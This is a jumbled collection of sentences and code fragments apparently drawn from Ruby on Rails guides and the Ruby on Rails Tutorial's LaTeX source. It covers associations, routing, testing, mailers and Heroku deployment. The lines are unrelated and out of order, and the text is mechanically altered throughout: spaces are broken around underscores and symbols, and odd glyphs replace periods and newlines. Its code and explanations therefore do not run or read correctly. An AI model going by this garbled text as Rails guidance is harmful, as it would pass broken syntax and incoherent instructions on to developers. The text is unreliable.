Note that the \ kode { remember \ _ token } argument in the \ kode { authenticated ? } \ method defined in Listing ~ \ ref { code : authenticated _ p } is not the same as the accessor that we defined in Listing ~ \ ref { code : user _ model _ remember } using \ kode { attr \ _ accessor : remember \ _ token } ; instead , it is a variable local to the method .
Object ▖ qualified _ const _ set ( &quot; Math : : Phi &quot; , 1 ▖ 618034 ) # = &gt; 1 ▖ 618034
And this will give you a single `Order` object for each date where there are orders in the database .
╼ ╼ \ subsection { Heroku deployment , step one } ╼ \ label { sec : heroku _ step _ one } ╼ ╼
This loads all the articles and the associated category and comments for each article .
statement _ limit : 200
At this point , the test suite should still be \ passing :
The tests should all be passing now .
The `find _ each` method retrieves a batch of records and then yields _ each _ record to the block individually as a model ▖
If they are implemented using JavaScript , they may be bypassed if ╼ JavaScript is turned off in the user &apos;s browser ▖
Because we included \ kode { will \ _ paginate } both above and below the user list , the pagination links appear in both places .
Tests to enforce logged-in status mirror those for the Users controller ( Listing ~ \ ref { code : edit _ update _ redirect _ tests } and Listing ~ \ ref { code : action _ tests _ admin } ) .
If a block is passed the separators are those elements of the array for which the block returns true :
# # # Eager Loading Multiple Associations
The second change needed to get Listing ~ \ ref { code : micropost _ form } to work is to redefine the error-messages partial so the following code from Listing ~ \ ref { code : micropost _ form } works :
Here we &apos;ve generated the necessary \ kode { account \ _ activation } method as well as the \ kode { password \ _ reset } method we &apos;ll need in Section ~ \ ref { sec : password _ reset } .
The first and preferred method is to use RVM , which includes Bundler integration as of version 1 ▖ 11 .
This is the home page for the
to _ visit &lt; &lt; node if visited ▖ exclude ? (
redirect _ to photos _ path , status : 301
If no associated object is found , it returns `nil` .
Variables
NOTE : Defined in `active _ support / core _ ext / module / reachable ▖ rb` .
We can achieve this in two ways ▖
As a result , the initial guess of
# # # # `symbolize _ keys` and `symbolize _ keys !
In the remainder of this guide , you &apos;ll learn how to declare and use the various forms of associations ▖
We &apos;ll start by adding the special \ kode { will \ _ paginate } method in the view ( Listing ~ \ ref { code : will _ paginate _ index _ view } ) ; we &apos;ll see in a moment why the code appears both above and below the user list .
specifies where in the loading sequence the CSS in \ kode { application ▖ css } itself gets included .
Adding a root route for users .
redirect _ to @ article
For simplicity , all command line examples use a Unix-style command line prompt ( a dollar sign ) , as follows :
Don &apos;t use this line .
The result of making a successful submission by hand appears in Figure ~ \ ref { fig : micropost _ with _ image } .
* * `Rails : : Rack : : Logger` * *
Method
self ▖ default _ params = {
Listing ~ \ ref { code : unicorn _ config } changes the formatting slightly so that the code fits in the standard 80 columns .
You &apos;ll note that it differs in some details---for example , we &apos;ll end up adding a Rails logo on the page---but that &apos;s fine , since a mockup need not be exact .
The Rails \ kode { debug } information is shown as \ href { http : / / www ▖ yaml ▖ org / } { YAML } ( a \ href { http : / / catb ▖ org / jargon / html / R / recursive-acronym ▖ html } { recursive acronym } standing for ``YAML Ain &apos;t Markup Language &apos; &apos; ) , which is a friendly data format designed to be both machine- \ emph { and } human-readable .
The step file goes in the \ kode { features / step \ _ definitions } directory ; we &apos;ll call it \ kode { authentication \ _ steps ▖ rb } .
We &apos;ll fix this blemish in Section ~ \ ref { sec : changing _ the _ layout _ links } ▖ )
An XmlMarkup object named `xml` is automatically made available to templates with a ` ▖ builder` extension .
# Before filters
Having placed the user &apos;s id securely in the temporary session , we are now in a position to retrieve it on subsequent pages , which we &apos;ll do by defining a \ kode { current \ _ user } method to find the user in the database corresponding to the session id .
( At this point , I also recommend removing the \ kode { hello } action from the Application controller if you added it at the beginning of this section ▖ )
* Represent associations between these models .
* * Solution to N + 1 queries problem * *
group : production do
The result of visiting \ href { http : / / localhost : 3000 / signup } { / signup } and just clicking ``Create my account &apos; &apos; ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / blank _ signup _ password _ digest _ bootstrap _ 4 _ 0-full ▖ png } { ( full size ) }
Because Rails controllers generally share code for things like authentication ╼ and accessing session variables , they inherit from `ApplicationController` by ╼ default ▖
\ href { http : / / mbsy ▖ co / 6VQ8l } { Code School } : Good interactive online programming courses
We &apos;ll fix our test suite by logging the user in before hitting the edit or update actions .
It also adds the additional condition that the object must be in the collection .
If you wait a couple of minutes and reload the pages , you &apos;ll see how the text gets automatically updated based on the new time .
Changing the root route to return ``goodbye , world ! &apos; &apos; .
Unfortunately , this is impossible to arrange with fixtures , and adding a \ kode { password } attribute to Listing ~ \ ref { code : real _ user _ fixture } causes Rails to complain that there is no such column in the database ( which is true ) .
As with login ( Listing ~ \ ref { code : correct _ login _ failure } ) , in the case of an invalid submission we re-render the \ kode { new } page with a \ kode { flash ▖ now } message .
&lt; % = form _ for ( zone ) do &#124; f &#124; % &gt;
If we meet some day , and you think
* `config ▖ active _ record ▖ logger` accepts a logger conforming to the interface of Log4r or the default Ruby Logger class , which is then passed on to any new database connections made ▖
* Use assert _ not methods instead of refute .
Adding microposts creation to the Home page ( \ href { http : / / localhost : 3000 / } { / } ) .
use Rack : : MethodOverride
It is by inheriting from \ kode { ActiveRecord : : Base } that our model objects gain the ability to communicate with the database , treat the database columns as Ruby attributes , and so ~ on .
You should change them to use class methods , e ▖ g ▖ `self ▖ serialized _ attributes` to `self ▖ class ▖ serialized _ attributes` .
&quot; / Users / ryan / Sites / side _ projects / blorgh / test / dummy / app / views &quot; *
I also like to use \ kode { co } in place of the more verbose \ kode { checkout } command , which we can arrange as follows :
We could use the user &apos;s id instead , since it &apos;s already exposed in the URLs of our application , but using email addresses is more future-proof in case we want to obfuscate user ids for any reason ( such as to prevent competitors from knowing how many users our application has , for example ) .
For example , instead of :
# # # # The Hard Way
The next two cases correspond to the two branches in the main \ kode { if } statement shown in Listing ~ \ ref { code : password _ reset _ update _ action } .
attr _ internal : controller , : template
admin ▖ validates : email , presence : true
If you are deploying a production application to a system without any ╼ pre-existing JavaScript runtimes , you may want to add one to your Gemfile :
For example , consider this model :
A \ href { http : / / en ▖ wikipedia ▖ org / wiki / Session _ ( computer _ science ) } { \ emph { session } } is a semi-permanent connection between two computers , such as a client computer running a web browser and a server running Rails .
Then move on .
/ about
Switched to branch &apos; master&apos;
def self ▖ default _ scope
We see here that the \ kode { nil } object doesn &apos;t itself respond to the \ kode { empty ? } \ method , but \ kode { nil ▖ to \ _ s } does .
If you set the ` : autosave` option to `true` , Rails will save any loaded members and destroy members that are marked for destruction whenever you save the parent object .
The application code is a one-liner :
username : blog
It intends to prevent odd bugs and confusion in code that call mutator ╼ methods directly on the `Relation` .
const _ name = path ▖ demodulize
That &apos;s quite a lot of text !
rails new appname --skip-sprockets
t ▖ string : name
Earlier versions of Rails used a blacklist approach for the strip _ tags ( ) , strip _ links ( ) and sanitize ( ) method ▖
and so on .
The `delegate` macro accepts several methods :
As with production email configuration ( Listing ~ \ ref { code : sendgrid _ config } ) , Listing ~ \ ref { code : carrier _ wave _ configuration } uses Heroku \ kode { ENV } variables to avoid hard-coding sensitive information .
Article ▖ published
subject : &apos; Welcome to My Awesome Site &apos; ) do &#124; format &#124;
The new micropost page ( \ href { http : / / localhost : 3000 / microposts / new } { / microposts / new } ) ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / demo _ new _ micropost-full ▖ png } { ( full size ) }
Because we already have a test for signing up with valid information , we &apos;ll add the steps to the test developed in Section ~ \ ref { sec : a _ test _ for _ valid _ submission } ( Listing ~ \ ref { code : a _ test _ for _ valid _ submission } ) .
The engine should ╼ only be enhancing it , rather than changing it drastically .
method , which we saw at the end of Section ~ \ ref { sec : modifying _ built _ in _ classes } ▖ )
some _ klass ▖ acts _ like ? ( : string )
With the code in Listing ~ \ ref { code : micropost _ ordering } , the tests should be \ passing :
Although Bootstrap comes with CSS rules for nice typography , we &apos;ll also add some custom rules for the appearance of the text on our site , as shown in Listing ~ \ ref { code : typography _ css } .
# # # Laying down the ground work
0 ▖ ▖ 7 ) # = &gt; true
This discussion suggests modeling the followed users as in Figure ~ \ ref { fig : naive _ user _ has _ many _ following } , with a \ kode { following } table and a \ kode { has \ _ many } association .
when &apos; Bad User&apos;
Another technique related to models involves undoing \ emph { migrations } , which we saw briefly in Chapter ~ \ ref { cha : a _ toy _ app } and will see much more of starting in Chapter ~ \ ref { cha : modeling _ users } .
A user row in the SQLite database \ kode { db / development ▖ sqlite3 } ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / sqlite _ user _ row _ with _ password _ 4 _ 0-full ▖ png } { ( full size ) }
# # # Using Array / Hash of Named Associations
The ╼ `author _ class` method should always return a `Class` object .
With that , the friendly forwarding integration test in Listing ~ \ ref { code : friendly _ forwarding _ test } should pass , and the basic user authentication and page protection implementation is complete .
You can do this by running the ╼ following in the `blog` directory :
To run \ emph { all } the tests , hit return at the \ kode { guard &gt; } prompt .
( end ) ╼ ╼ \ section { Activating the account } % ( fold ) ╼ \ label { sec : activating _ the _ account } ╼ ╼
The result appears in Figure ~ \ ref { fig : signup _ failure } , and the full debug information ( with an increased font size ) appears in Figure ~ \ ref { fig : signup _ failure _ rails _ debug } .
string &apos; , &apos; foo &apos; )
( As a general rule , you should refresh the file tree any time files or directories don &apos;t appear as expected ▖ )
def load _ missing _ constant ( from _ mod , const _ name )
in Listing ~ \ ref { code : relationships _ belongs _ to _ test } .
We &apos;ll also take a more concrete look at the effects of adding \ kode { has \ _ secure \ _ password } to the User model , including an examination of the important \ kode { authenticate } method .
We then visit the link from the email and again submit invalid and valid information , verifying the correct behavior in each case .
( Remember , you aren &apos;t supposed to understand this code right now .
force config / routes ▖ rb
hash = { a : 1 , b : 2 }
Should documentation elsewhere be updated ?
as shown in Listing ~ \ ref { code : micropost _ partial } .
# # # Auto encoding header values
Using the `find` method , you can retrieve the object corresponding to the specified _ primary key _ that matches any supplied options ▖
We haven &apos;t discussed arrays yet in the \ emph { Rails Tutorial } , but understanding them gives a good foundation for understanding hashes ( Section ~ \ ref { sec : hashes _ and _ symbols } ) and for aspects of Rails data modeling ( such as the \ kode { has \ _ many } association seen in Section ~ \ ref { sec : demo _ user _ has _ many _ microposts } and covered more in Section ~ \ ref { sec : user _ micropost _ associations } ) .
In Chapter ~ \ ref { cha : basic _ login } , we &apos;ll use the \ kode { authenticate } method to sign registered users into our site .
( The call to \ kode { to \ _ s } is to make sure we can handle \ kode { nil } tokens , which shouldn &apos;t happen in browsers but sometimes happens in tests ▖ )
your username is : &lt; % = @ user ▖ login % &gt; ▖ &lt; br &gt;
&lt; / ul &gt;
For our purposes , the ``starter &apos; &apos; tier ( which is limited to 200 emails a day but costs nothing ) is the best fit .
If you set this to `northwest _ ` , then the Customer class will look for `northwest _ customers` as its table ▖
Hashes , in contrast , are different .
To get the tests to \ passing , we need to make an exception to the password validation if the password is empty .
Here &apos;s the section of the default configuration file ( `config / database ▖ yml` ) with connection information for the development environment :
It also doesn &apos;t actually create a new user .
radio _ button _ tag &apos; gender &apos; , &apos; male&apos;
The result appears in Listing ~ \ ref { code : log _ out _ with _ test _ close _ browser }
This will generate the exact same routes as the first example ▖
assemblies ▖ clear
belongs _ to : supplier
This helper validates the length of the attributes &apos; values ▖
* Responsible for storing the session in cookies .
Setting it will have no ╼ effect on the application ▖
\ failing \ \ \ filepath { test / controllers / static \ _ pages \ _ controller \ _ test ▖ rb } } ╼ % = lang : ruby , options : &quot; hl _ lines &quot; : &#91; 15 , 16 , 17 , 18 &#93; ╼ \ begin { code } ╼ require &apos; test _ helper &apos; ╼ ╼ class StaticPagesControllerTest &lt; ActionController : : TestCase ╼ ╼ test &quot; should get home &quot; do ╼ get : home ╼ assert _ response : success
Finally , this data model is a maintainability nightmare : each time a user changed ( say ) their name , we would need to update not just the user &apos;s record in the \ kode { users } table but also \ emph { every row containing that user } ╼ in both the \ kode { following } and \ kode { followers } tables .
To get the deployment to work , we first need to add a line forcing the use of SSL in production .
has _ many : comments
A password reset has expired if the time interval since the reset was sent is greater than the expiration limit :
# The result could either be
It &apos;s worth emphasizing that the goal of this book is \ emph { not } merely to teach Rails , but rather to teach \ emph { web development with Rails } , which means acquiring ( or expanding ) the skills needed to develop software for the World Wide Web .
( As noted in Section ~ \ ref { sec : adding _ to _ the _ layout } , the use of options hashes is a recurring theme in Rails ▖ )
We &apos;ll thus write a short integration test for the login form submission before proceeding .
Rails ▖ application ▖ config ▖ action _ dispatch ▖ cookies _ serializer = : hybrid
For more on the origins of ``foo &apos; &apos; and ``bar &apos; &apos; ---and , in particular , the possible \ emph { non } -relation of ``foobar &apos; &apos; to ``FUBAR &apos; &apos; ---see the \ href { http : / / www ▖ catb ▖ org / jargon / html / F / foo ▖ html } { Jargon File entry on ``foo &apos; &apos; } .
Extensions to `NameError`
else
# SELECT DISTINCT role FROM clients
# # # # # `collection ( force _ reload = false ) `
Use the `uniq` method to remove duplicates from the collection .
Finally , in Chapter ~ \ ref { cha : user _ microposts } , we &apos;ll use the identity of a logged-in user to create microposts associated with that user , and in Chapter ~ \ ref { cha : following _ users } we &apos;ll allow the current user to follow other users of the application ( thereby receiving a feed of their microposts ) .
* `index ▖ html ▖ erb`
page for a new session ( signin )
&quot; Person &quot; ▖ tableize # = &gt; &quot; people &quot;
The worms exploits a hole in Yahoo &apos;s HTML / JavaScript filter , which usually filters all target and onload attributes from tags ( because there can be JavaScript ) ▖
If all went well , you should run the full test suite to verify that all the tests are \ passing :
def counter _ cache _ column
For clarity , this tutorial always uses the full command , but in real life most Rails developers use one or more of the shortcuts shown in Table ~ \ ref { table : shortcuts } .
Client ▖ where ( &quot; orders _ count = ? &quot; , params &#91; : orders &#93; )
template _ name : &apos; another &apos; )
Note here that a factory can take an option :
* Use `a = b` and not `a = b` .
The method `end _ of _ day` returns a timestamp at the end of the day ( 23 : 59 : 59 ) :
GlobalID
{ a : 1 , b : 2 } ▖ with _ indifferent _ access ▖ slice ( &quot; a &quot; )
Caching will only happen if ActionController : : Base ▖ perform _ caching is set to true ( which is the case by default for the Rails production environment , but not for the development environment ) .
Client ▖ distinct ▖ pluck ( : role )
c ▖ first _ name = &apos; Manny&apos;
The ` &lt; % % &gt; ` tags are used to execute Ruby code that does not return anything , such as conditions , loops or blocks , and the ` &lt; % = % &gt; ` tags are used when you want output .
HTML for the login form produced by Listing ~ \ ref { code : login _ form } .
If you do not want the instance predicate , pass `instance _ predicate : false` and it will not be defined .
In Rails 3 , 406 Not Acceptable was always returned ▖
( With the cloud IDE , this involves clicking the arrow in the file navigator to open the sample app directory and double-clicking the \ kode { Gemfile } icon ▖ )
{ a : 1 } ▖ with _ indifferent _ access ▖ except ( : a ) # = &gt; { }
Article ▖ where ▖ not ( author : author )
$ rails --version
* `config ▖ active _ record ▖ record _ timestamps` is a boolean value which controls whether or not timestamping of `create` and `update` operations on a model occur ▖
it asks the router to match it to a controller action ▖
&lt; th &gt; &lt; / th &gt;
Configuring the application to use SSL in production .
The method `instance _ values` returns a hash that maps instance variable names without &quot; @ &quot; to their ╼ corresponding values ▖
Password
By the way , the tests take some time to start , which is due to two factors : ( 1 ) starting the \ emph { Spring server } to preload parts of the Rails environment , which only happens the first time ; and ( 2 ) overhead associated with Ruby startup time .
Classes are simply a convenient way to organize \ emph { functions } ( also called \ emph { methods } ) like the \ kode { home } and \ kode { help } actions , which are defined using the \ kode { def } keyword .
Return a new Micropost object ( \ kode { user \ _ id = user ▖ id } ) .
Now that we &apos;ve created the actions and views for some static pages , we &apos;ll make them \ emph { slightly } dynamic by adding some content that changes on a per-page basis : we &apos;ll have the title of each page change to reflect its content .
( Because \ kode { activation \ _ token } is a virtual attribute ( Section ~ \ ref { sec : account _ activations _ resource } ) , the user from the database doesn &apos;t have one ▖ )
The result appears in Listing ~ \ ref { code : remember _ digest _ should _ not _ be _ blank }
-----
which generates
The default error message for `validates _ associated` is _ &quot; is invalid &quot; _ ▖
To make the effects of \ kode { image \ _ tag } clearer , let &apos;s look at the HTML it produces
We first create a \ kode { password \ _ reset } method in the user mailer ( Listing ~ \ ref { code : mail _ password _ reset } ) , and then define view templates for plain-text email ( Listing ~ \ ref { code : password _ reset _ text } ) and HTML email ( Listing ~ \ ref { code : password _ reset _ html } ) .
As a contributor , it &apos;s important to think about whether this API is meant for end-user consumption ▖
Any time something isn &apos;t behaving as expected or a process appears to be frozen , it &apos;s a good idea to run \ texttt { ps aux } to see what &apos;s going on , and then run \ texttt { kill -9 &lt; pid &gt; } or \ texttt { pkill -9 -f &lt; name &gt; } to clear things up .
We first saw microposts in larval form in Chapter ~ \ ref { cha : a _ toy _ app } , and in this chapter we will make a full-strength version of the sketch from Section ~ \ ref { sec : microposts _ resource } by constructing the Micropost data model , associating it with the User model using the \ kode { has \ _ many } and \ kode { belongs \ _ to } methods , and then making the forms and partials needed to manipulate and display the results ( including , in Section ~ \ ref { sec : micropost _ images } , uploaded images ) .
* `collection ▖ empty ?
In the final two examples , the block inside \ kode { map } involves calling a particular method on the block variable , and in this case there &apos;s a commonly used shorthand :
Recall from the discussion in Section ~ \ ref { sec : mailer _ templates } that the activation token and email are available as \ kode { params &#91; : id &#93; } and \ kode { params &#91; : email &#93; } , respectively .
On the first request the assets are compiled and cached as outlined in ╼ development above , and the manifest names used in the helpers are altered to ╼ include the MD5 hash .
The default value is designed for security , not for speed , which is perfect for production applications , but in tests our needs are reversed : we want \ emph { fast } tests , and don &apos;t care at all about the security of the test users &apos; password hashes .
as shown in Listing ~ \ ref { code : updated _ error _ messages _ partial } .
Utility methods for following ▖
# the seed , which is printed after each run .
Let &apos;s see how to load its definition .
When ` : instance _ reader` is `false` , the instance predicate returns a `NoMethodError` just like the reader method .
# 2 ▖ even ?
There are a number of settings available on `config ▖ action _ mailer` :
By ╼ default ▖ coffee and ▖ scss files will not be precompiled on their own ▖
Rails will first look for this template ▖
Rails supports six types of associations :
NOTE : Defined in `active _ support / core _ ext / kernel / reporting ▖ rb` .
( We &apos;ll start creating our own controllers in Chapter ~ \ ref { cha : a _ toy _ app } ▖ )
Developed over the course of building an application , the resulting \ emph { test suite } serves as a safety net and as executable documentation of the application source code .
Nested hashes .
# Replace with code to make a user variable
Adding in assertions for the right links yields the tests shown in Listing ~ \ ref { code : following _ tests } .
Passenger makes it easy to run your application in a subdirectory ▖
$ ( &apos; # logo &apos; ) ▖ attr src : &quot; &lt; % = asset _ path ( &apos; logo ▖ png &apos; ) % &gt; &quot;
To find the current layout , Rails first looks for a file in `app / views / layouts` with the same base name as the controller ▖
NOTE : If you want to make the format segment mandatory , so it cannot be omitted , you can supply `format : true` like this :
use ActionDispatch : : ShowExceptions
A ` : nodoc : ` should never be added simply because a method or class is missing documentation ▖
location ~ ^ / assets / {
`try` can also be called without arguments but a block , which will only be executed if the object is not nil :
Active Support extends this API to be able to pass ╼ relative qualified constant names .
redirect _ to action : &apos; read _ cookie&apos;
----------------------------------------
In particular , \ kode { count } does \ emph { not } pull all the microposts out of the database and then call \ kode { length } on the resulting array , as this would become inefficient as the number of microposts grew .
What are engines ?
A test to ensure that the \ kode { user \ _ id } isn &apos;t accessible .
# # # The `has _ and _ belongs _ to _ many` Association
If you have no prior experience with Ruby , you will find a very steep learning ╼ curve diving straight into Rails ▖
to associate a micropost with a given user .
* `config ▖ action _ controller ▖ permit _ all _ parameters` sets all the parameters for mass assignment to be permitted by default ▖
# Enable parameter wrapping for JSON ▖ You can disable this by setting : format to an empty array .
Before moving on , we &apos;ll add a couple of Relationship model validations for completeness .
I shall be late ! &quot; ▖ truncate ( 20 , omission : &apos; &amp; hellip ; &apos; )
has _ one : account , - &gt; { where active : true }
You can use initializers to hold configuration settings that should be made after all of the frameworks and gems are loaded , such as options to configure settings for these parts .
Returns the character of the string at position `position` :
We &apos;ve already seen how Capybara supports an intuitive web-navigation syntax .
the user does not need to know which is the actual default value of the flag , ╼ and so we only document its boolean semantics .
= &gt; false
Possible values are : &lt; ul &gt;
The `collection = ` method makes the collection contain only the supplied objects , by adding and deleting as appropriate .
With RSpec and Capybara , we will be able to write expressive tests to automate tasks that used to have to be done by hand .
By the way , there actually exists a full regex for matching email addresses according to the official standard , but it &apos;s really not worth the trouble .
# # # # JSON gem compatibility
The following methods trigger validations , and will save the object to the ╼ database only if the object is valid :
Without this file , the confirmation dialog box wouldn &apos;t appear .
module N
You can read more about the Rails Internationalization ( I18n ) API &#91; here &#93; ( i18n ▖ html ) .
&#124; ----------------------- &#124; --------------------------------------------------------------------------------- &#124;
The asset pipeline provides a framework to concatenate and minify or compress ╼ JavaScript and CSS assets ▖
The About page at \ href { http : / / 0 ▖ 0 ▖ 0 ▖ 0 : 3000 / about } { / about } .
This would generate a query which contains a `LEFT OUTER JOIN` whereas the ╼ `joins` method would generate one using the `INNER JOIN` function instead .
( Since Ruby filenames typically use snake case , the Rails generator converts CamelCase to snake case using the \ href { http : / / api ▖ rubyonrails ▖ org / classes / ActiveSupport / Inflector ▖ html # method-i-underscore } { \ texttt { underscore } } method ▖ )
Similarly , in Chapter ~ \ ref { cha : modeling _ users } we &apos;ll generate a \ emph { model } as follows :
Now instead of the ugly Ruby object output , the author &apos;s name will be displayed .
&gt; &gt; p ▖ new _ record ?
The key is to check all three requirements for the feed : microposts for followed users and the user itself should be included in the feed , but a post from an \ emph { unfollowed } user should not be included .
The User model with added account activation attributes .
/ application ▖ ( css &#124; js ) $ / &#93;
The query string strategy has several disadvantages :
In Section ~ \ ref { sec : email _ in _ production } , these variables were defined automatically via the SendGrid add-on , but in this case we need to define them explicitly , which we can accomplish using \ kode { heroku config : set } as follows :
The directives that work in JavaScript files also work in stylesheets ╼ ( though obviously including stylesheets rather than JavaScript files ) ▖
A mockup of the proto-feed with micropost delete links .
# # # Overriding the Named Helpers
╼ * = require _ self
create _ table : orders do &#124; t &#124;
create app / views / users / show ▖ json ▖ jbuilder
To do ╼ this , we need to implement a link of some sort in the view and a `destroy` ╼ action in the `CommentsController` .
&#124; File / Directory &#124; Purpose &#124;
We &apos;ll start with a couple tests involving collections of valid and invalid addresses .
&#124; PATCH / PUT &#124; / kategorien / : id &#124; categories # update &#124; category _ path ( : id ) &#124;
We &apos;ll continue this theme by using a \ kode { destroy } action to delete sessions , i ▖ e ▖ , to log out .
$ rake
Paginating the users in the \ kode { index } action .
That means that you can require it like this :
As a result , it &apos;s convenient to use a common topic branch :
to visit the root path before each example .
This can be ╼ added above the `title` field with this code :
# # # `has _ and _ belongs _ to _ many` Association Reference
These ╼ classes must implement a `validate` method which takes a record as an argument ╼ and performs the validation on it ▖
# polymorphic _ url ( record ) # same as comment _ url ( record )
app / assets / javascripts / home ▖ js
* Call `redirect _ to` to send an HTTP redirect status code to the browser
At this point , we &apos;re ready to merge our changes into the master branch :
The mockups in the \ emph { Ruby on Rails Tutorial } are made with an excellent online mockup application called \ href { http : / / gomockingbird ▖ com } { Mockingbird } .
$ cat ~ / ▖ ssh / id _ rsa ▖ pub
The default Rails cache store will be used by Sprockets to cache assets in ╼ development and production ▖
person ▖ errors &#91; : name &#93;
If you don &apos;t have Ruby installed have a look at ╼ &#91; ruby-lang ▖ org &#93; ( https : / / www ▖ ruby-lang ▖ org / en / installation / ) for possible ways to ╼ install Ruby on your platform .
Defining a Factory Girl sequence .
If you create an association some time after you build the underlying model , you need to remember to create an `add _ column` migration to provide the necessary foreign key .
The other place with links is the footer partial , \ kode { \ _ footer ▖ html ▖ erb } , which has links for the About and Contact pages ( Listing ~ \ ref { code : footer _ partial _ links } ) .
# # # # escape _ javascript
Implementing \ kode { user ▖ followers } using passive relationships .
To enable this , pass a new object to the config option in `application ▖ rb` :
&lt; h1 &gt; Edit article &lt; / h1 &gt;
# Activates an account .
( Because the default navbar color changed between Boostrap 2 ▖ 0 and 2 ▖ 1 , we need the \ kode { navbar-inverse } class to make it dark instead of light ▖ )
Although virtually all Rails developers agree that testing is a good idea , there is a diversity of opinion on the details .
invoke rspec
An alternate implementation of the \ kode { before \ _ save } callback ▖
module BangBang
Our strategy for handling account activation parallels user login ( Section ~ \ ref { sec : logging _ in } ) and especially remembering users ( Section ~ \ ref { sec : remember _ me } ) .
&#124; HTTP Verb &#124; Path &#124; Controller # Action &#124; Named Helper &#124;
as shown in Listing ~ \ ref { code : add _ remember _ digest _ to _ users _ generated } .
delegate : street , to : : address , prefix : true
It is shorter , and the intention more obvious .
Extensions can refer to the internals of the association proxy using these three attributes of the `proxy _ association` accessor :
In particular , we can write
In the present case , since we are still in the Users controller but want to paginate \ emph { microposts } instead , we pass an explicit \ kode { @ microposts } variable to \ kode { will \ _ paginate } .
$ rmdir workspace /
This is ╼ done by the `isolate _ namespace` call inside the `Engine` class ▖
Here we use \ kode { is \ _ logged \ _ in ? } \ instead of \ kode { logged \ _ in ? } \ so that the test helper and Sessions helper methods have different names , which prevents them from being mistaken for each other
By default , Rails will serve the results of a rendering operation with the MIME content-type of `text / html` ( or `application / json` if you use the ` : json` option , or `application / xml` for the ` : xml` option ▖ ) ▖
in Listing ~ \ ref { code : add _ activation _ to _ users _ migration } .
belongs _ to : author , class _ name : &quot; User &quot;
# # # # # `ago` , `since`
In this case , saving or destroying an order will update the timestamp on the associated customer ▖
To make the scaffold styling apply , insert this line into the ` &lt; head &gt; ` ╼ tag of this layout :
in Listing ~ \ ref { code : sample _ relationships } .
end _ of _ month ( at _ end _ of _ month )
article GET / articles / : id ( ▖ : format ) articles # show
in Listing ~ \ ref { code : remember _ test } .
Rails views can contain static HTML or embedded Ruby ( ERb ) .
# Now you have to do this
Rails will use that particular setting to configure Active Record .
To try to avoid collisions people choose some label that characterizes what the chaining is about :
config ▖ action _ mailer ▖ default _ options = {
Because the \ kode { account \ _ activation } method defined in Listing ~ \ ref { code : mail _ account _ activation } requires a valid user object as an argument , the code in Listing ~ \ ref { code : generated _ user _ mailer _ previews } won &apos;t work as written .
&quot; foo \ n \ nbar &quot; ▖ indent ( 2 , nil , true ) # = &gt; &quot; foo \ n \ n bar &quot;
╼ &gt; &gt; x - = 7
We begin our development of the Microposts resource with some access control in the Microposts controller .
self ▖ include _ root _ in _ json = false
Just as with member routes , you can pass ` : on` to a route :
Active Record uses the `new _ record ? ` instance ╼ method to determine whether an object is already in the database or not .
In Ruby 1 ▖ 9 `prev _ year` and `next _ year` return a date with the same day / month in the last or next year :
page to make a new user
i ▖ save !
\ href { http : / / www ▖ michaelhartl ▖ com / } { Michael Hartl } is the author of the \ href { http : / / www ▖ railstutorial ▖ org / } { \ emph { Ruby on Rails Tutorial } } , the leading introduction to web development with \ href { http : / / rubyonrails ▖ org / } { Ruby on Rails } .
* Use Ruby &gt; = 1 ▖ 9 syntax for hashes ▖
For example , if ╼ you have an instance variable ` @ article` containing an article , you can retrieve ╼ all the comments belonging to that article as an array using ╼ ` @ article ▖ comments` .
# # # Changes on Default Scopes
To eliminate an unwanted process , use the \ texttt { kill } command to issue the Unix kill code ( which \ href { https : / / en ▖ wikipedia ▖ org / wiki / Unix _ signal # List _ of _ signals } { happens to be ~ 9 } ) to the pid :
Rails makes them easy to use , provides ╼ built-in helpers for common needs , and allows you to create your own validation ╼ methods as well .
The method `to _ formatted _ s` acts like `to _ s` by default .
&#124; key &#124; key _ len &#124; ref &#124; rows &#124; Extra &#124;
NOTE : Defined in `active _ support / core _ ext / object / try ▖ rb` .
@ see _ more = videos ▖ many ?
* Are you happy with the tests ?
yield ( : content ) : yield % &gt; &lt; / div &gt;
# 1 ▖ odd ?
SELECT * FROM clients LIMIT 1
mail = Notifier ▖ notify ( user , ▖ ▖ ▖ )
end
C ▖ new ( 0 , 1 ) ▖ instance _ variable _ names # = &gt; &#91; &quot; @ x &quot; , &quot; @ y &quot; &#93;
format ▖ js { }
M ▖ parent # = &gt; X : : Y
&lt; / tr &gt;
Use the : filter _ html option to remove HTML which was not created by the Textile processor .
We &apos;ll first mirror the format validation by using the \ kode { accept } parameter in the \ kode { file \ _ field } input tag :
In `development ▖ rb` :
This is because the user &apos;s remember digest was deleted as part of logging out ( Listing ~ \ ref { code : user _ model _ forget } ) in Firefox , so when we access the application in Chrome we end up calling
If you have \ href { http : / / brew ▖ sh / } { Homebrew } on OS ~ X , you can install \ kode { curl } using \ kode { brew install curl } .
* `collection &lt; &lt; ( object , ▖ ▖ ▖ )
The above migration creates a method named `change` which will be called when ╼ you run this migration ▖
That code includes the lines
create a new session ( login )
If the code in Listing ~ \ ref { code : micropost _ dependency } is working correctly , the test suite should still be \ passing :
method
create test / controllers / welcome _ controller _ test ▖ rb
The `redirect _ to` method does something completely different : it tells the browser to send a new request for a different URL ▖
Account activations and password resets use a generated token to create a unique URL for activating users or resetting passwords , respectively .
If set to true ( the default ) , then the Customer class will use the `customers` table ▖
We see here that a file has been deleted , but the changes are only on the ``working tree &apos; &apos; ; they haven &apos;t been committed yet .
For more on Ruby classes and the \ kode { self } keyword , see the \ href { http : / / railstips ▖ org / } { RailsTips } post `` \ href { http : / / railstips ▖ org / blog / archives / 2006 / 11 / 18 / class-and-instance-variables-in-ruby / } { Class and Instance Variables in Ruby } &apos; &apos; .
&quot; b &quot; , &quot; r &quot; , &quot; o &quot; , &quot; f &quot; , &quot; e &quot; , &quot; w &quot; , &quot; v &quot; , &quot; m &quot; , &quot; a &quot; , &quot; x &quot; , &quot; p &quot; &#93;
( The green welcome message is accomplished using the \ emph { flash } , which we &apos;ll learn about in Section ~ \ ref { sec : the _ flash } ▖ )
dependent : : destroy
The result will be to replace the default Rails page from Figure ~ \ ref { fig : riding _ rails } with the ``hello , world &apos; &apos; page that is the goal of this section .
See the GitHub post \ href { https : / / github ▖ com / blog / 926-shiny-new-commit-styles } { Shiny new commit styles } for more information .
Subjects include Ruby on Rails , front-end development , web design , and data science .
( Now you know why HTML views have the file extension \ kode { ▖ html ▖ erb } ▖ )
╼ $ &lt; editor name &gt; .
Finally , use the \ kode { heroku create } command to create a place on the Heroku servers for the sample app to live ( Listing ~ \ ref { code : heroku _ create } ) .
